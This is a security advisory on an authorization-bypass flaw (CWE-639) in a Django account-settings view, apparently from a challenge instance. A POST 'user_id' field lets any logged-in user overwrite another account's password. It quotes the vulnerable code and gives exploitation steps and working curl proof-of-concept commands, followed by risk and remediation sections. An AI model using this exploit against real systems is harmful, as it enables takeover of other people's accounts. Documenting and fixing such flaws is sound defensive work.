# Description

The password-change branch of the account settings view trusts a `user_id` value taken from the POST body. The current-password check is performed against the logged-in user (`request.user`), but the new password is written to whichever user the `user_id` field points to. Any authenticated user can therefore replace the password of any other account, including the platform administrator, by supplying their own valid old password together with the administrator's Django user ID (e.g. `user_id=1` if the administrator has that ID).

**CWE-639: Authorization Bypass Through User-Controlled Key**

Vulnerable code (deployed source, `djangoWocshack_5/Account/views.py`):

```python
# Account/views.py:425-444
if 'old_password' in request.POST:                                   # line 425
    old = request.POST['old_password']                               # line 426
    new = request.POST['new_password']                               # line 427
    confirm = request.POST['confirm_password']                       # line 428

    user_id = request.POST.get('user_id', request.user.id)           # line 430  <-- attacker-controlled
    try:
        target_user = User.objects.get(id=user_id)                   # line 432  <-- lookup by POST value
    except User.DoesNotExist:
        target_user = request.user                                   # line 434

    if new != confirm:                                               # line 436
        messages.error(request, "New passwords do not match.")
    elif not request.user.check_password(old):                       # line 438  <-- checks attacker's own password
        messages.error(request, "Old password is incorrect.")
    else:
        target_user.set_password(new)                                # line 441  <-- writes victim's password
        target_user.save()                                           # line 442
        update_session_auth_hash(request, request.user)              # line 443
        messages.success(request, "Password updated successfully.")  # line 444
```

The authorization check (`request.user.check_password(old)`, line 438) validates the attacker's credentials, but the object that is modified (`target_user`, lines 432-442) is selected from the attacker-supplied `user_id`. No check ensures `target_user == request.user`. The safe default that already exists on line 430 (`request.user.id`) is only used when the parameter is absent, which the attacker simply avoids sending.

The `user_id` parameter refers to a Django user ID, which is not necessarily the same as an identifier used by the banking backend or the position of a user in an API response.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Register or use any existing low-privilege account (e.g. `johndoe`) and log in at `/account/login/`. | Authenticated session cookie for `johndoe` is issued. |
| 2 | Identify the target account's Django user ID. The administrator may have `id=1` on the challenge instance, but this must be verified rather than assumed. | Target `user_id` is identified. |
| 3 | Load `/account/settings/` to obtain a valid `csrfmiddlewaretoken`. | Valid CSRF token is obtained for the authenticated session. |
| 4 | POST to `/account/settings/` with `old_password` set to `johndoe`'s own current password, `new_password`/`confirm_password` set to an attacker-chosen value (e.g. `pwned`), and `user_id=1` when that ID belongs to `admin`. | The view passes the `old_password` check against `johndoe`, looks up the targeted user via line 432, and calls `set_password()`/`save()` on that user (lines 441-442). The view redirects and queues the "Password updated successfully." message when the operation succeeds. |
| 5 | Attempt to log in at `/account/login/` as `admin` with the chosen new password. | The new credentials can be accepted for the administrator account. Full administrator access may still require an additional authentication factor such as TOTP. |

The unauthorized password replacement itself does not require the victim's participation or their existing password. Additional authentication controls may affect whether the attacker can subsequently establish a fully authenticated session as the victim.

# PoC

The original attack targets the platform administrator using its Django user ID (`user_id=1` in the example). To reproduce the same vulnerable code path without disrupting the administrator account, the following commands use a disposable target account. The attack mechanism and affected endpoint are identical.

For the local reproduction:

- Attacker: `test` (equivalent to `johndoe` in the original scenario).
- Target: `demo` (disposable account used instead of `admin`).

**Step 1: Log in as the low-privilege attacker account and store cookies**

```bash
BASE="http://localhost:8000"
ATTACKER_USER="test"

rm -f john.cookies

curl -sS -c john.cookies \
  "$BASE/account/login/" -o /dev/null

CSRF=$(awk '$6=="csrftoken" {print $7; exit}' john.cookies)

read -rsp "Current password of $ATTACKER_USER: " OLD_PASS
echo

curl -sS -D - -o /dev/null \
  -c john.cookies -b john.cookies \
  -H "Referer: $BASE/account/login/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "username=$ATTACKER_USER" \
  --data-urlencode "password=$OLD_PASS" \
  "$BASE/account/login/"
```

Confirm that the session is authenticated:

```bash
curl -sS -o /dev/null \
  -b john.cookies \
  -w "Settings HTTP: %{http_code}\n" \
  "$BASE/account/settings/"
# Expected: Settings HTTP: 200
```

A redirect to `/account/login/` indicates that the session is not authenticated. If the account uses TOTP, the second-factor challenge must be completed before proceeding.

**Step 2: Fetch the settings page to obtain a CSRF token for this session**

```bash
curl -sS -c john.cookies -b john.cookies \
  "$BASE/account/settings/" -o /dev/null

CSRF=$(awk '$6=="csrftoken" {print $7; exit}' john.cookies)
```

**Step 3: Change another user's password using the attacker's own old password**

The original exploit uses `user_id=1` to target the administrator, provided that account actually has Django ID 1.

For a non-destructive test, use the verified Django ID of the disposable `demo` account instead.

```bash
read -rp "Django user ID of demo: " TARGET_ID
read -rsp "New password for demo: " NEW_PASS
echo

curl -sS -D - -o /dev/null \
  -c john.cookies -b john.cookies \
  -H "Referer: $BASE/account/settings/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "old_password=$OLD_PASS" \
  --data-urlencode "new_password=$NEW_PASS" \
  --data-urlencode "confirm_password=$NEW_PASS" \
  --data-urlencode "user_id=$TARGET_ID" \
  "$BASE/account/settings/"
```

The view validates `OLD_PASS` against the logged-in attacker (`test`) but applies `NEW_PASS` to the account selected by `TARGET_ID` (`demo`).

A `302 Found` response is expected after processing the form, but it is not sufficient on its own to prove the password change succeeded: the view can also redirect after validation errors.

**Step 4: Verify the password change using a separate session**

Start a new session for the target account:

```bash
rm -f victim.cookies

curl -sS -c victim.cookies \
  "$BASE/account/login/" -o /dev/null

CSRF_VICTIM=$(awk '$6=="csrftoken" {print $7; exit}' victim.cookies)

curl -sS -D - -o /dev/null \
  -c victim.cookies -b victim.cookies \
  -H "Referer: $BASE/account/login/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF_VICTIM" \
  --data-urlencode "username=demo" \
  --data-urlencode "password=$NEW_PASS" \
  "$BASE/account/login/"
```

For an account without TOTP, verify that the new session can access the settings page:

```bash
curl -sS -o /dev/null \
  -b victim.cookies \
  -w "Target settings HTTP: %{http_code}\n" \
  "$BASE/account/settings/"
# Expected: Target settings HTTP: 200
```

If the target has TOTP enabled, the new password may be accepted while the login still requires a second factor. In that case, verify the authentication flow rather than treating a redirect alone as proof of full account access.

```bash
unset OLD_PASS NEW_PASS CSRF CSRF_VICTIM TARGET_ID
```

**Expected result:** A low-privilege user can change another account's password without knowing the target's existing password. The subsequent login using the attacker-chosen password confirms the unauthorized credential replacement.

The vulnerability was successfully reproduced on the local instance using `test` and `demo`. The administrator account was not modified during this validation.

The same vulnerable code path accepts an existing administrator's Django user ID. Consequently, a request using `user_id=1`, when that ID belongs to `admin`, can change the administrator's password. Whether the attacker can then access all administrator functionality depends on any additional authentication requirements.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Unauthorized password replacement can lead to account takeover. If the administrator session is obtained, the attacker may access admin-only views and sensitive account or platform data, including data exposed through privileged functionality. Additional authentication factors may restrict access. |
| Integrity | Any account, including the administrator, can have its credentials replaced. With access to a privileged session, an attacker may modify content, balances where permitted, and platform configuration. |
| Availability | An attacker can lock out legitimate administrators and other users by rewriting their passwords. Further disruption may be possible if privileged administrative access is obtained. |

Overall severity: **Critical**. Exploitation requires only a single low-privilege account and knowledge of a victim's Django user ID, with no victim interaction needed to replace the password.

The ability to target the administrator makes the vulnerability particularly severe. Full platform takeover is possible when the attacker can complete the administrator's authentication flow; TOTP or other additional controls may prevent immediate privileged access.

# Remediation

1. Remove the `user_id` POST parameter entirely. Always operate on `request.user`: `target_user = request.user`, and never look up a user from request data in the password-change path.

2. Keep the current-password verification and the write on the same object (`request.user.check_password(old)` followed by `request.user.set_password(new)` and `request.user.save()`).

3. Add a defensive authorization check so that any mismatch fails closed, for example `if target_user != request.user: raise PermissionDenied`.

4. Provide staff-driven password resets through a separate admin-only endpoint protected by `@user_passes_test(lambda u: u.is_superuser)` (or equivalent role checks), with its own audit logging, rather than overloading the self-service settings form.

5. Log and alert on password changes where the acting session and the affected account differ, and invalidate existing sessions for the affected account after any password change.

# Author

WOCSA
